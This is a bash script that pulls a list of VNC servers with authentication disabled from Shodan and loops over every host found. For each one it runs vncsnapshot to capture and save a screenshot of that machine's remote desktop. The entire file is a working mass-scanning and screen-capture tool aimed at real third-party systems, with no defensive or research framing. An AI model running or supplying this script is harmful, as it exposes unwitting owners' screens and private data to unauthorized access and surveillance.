#!/usr/bin/env bash

# Queries Shodan for unauthenticated VNC servers
# Attempts to take screenshots of all servers found

# Setup
datename=$(date -Iseconds | tr : -)
mkdir $datename && cd $datename

# Query Shodan for "'authentication disabled' 'RFB 003.008'"
shodan download search "'authentication disabled' 'RFB 003.008'" 2> /dev/null
shodan parse --fields ip_str,port --separator : search.json.gz 2> /dev/null > "shodan.$datename.log"
rm search.json.gz # Cleanup

# Iterate over findings; take screenshots
while read line; do
    host=$(awk -F: '{print $1}' <<< $line)
    port=$(awk -F: '{print $2}' <<< $line)

    # Take screenshots; print log to user; 15s timeout
    echo [!] Screenshot attempt started on $host:$port

    timeout 15s vncsnapshot -quiet $host:$(expr $port - 5900) $host-$port.jpg
    if [[ $? -eq 124 ]]; then
        echo Timed out.
    fi

    echo -e "Attempt finished on $host:$port\n"
done < shodan.$datename.log

printf "\nDone -- check directory ./$datename"
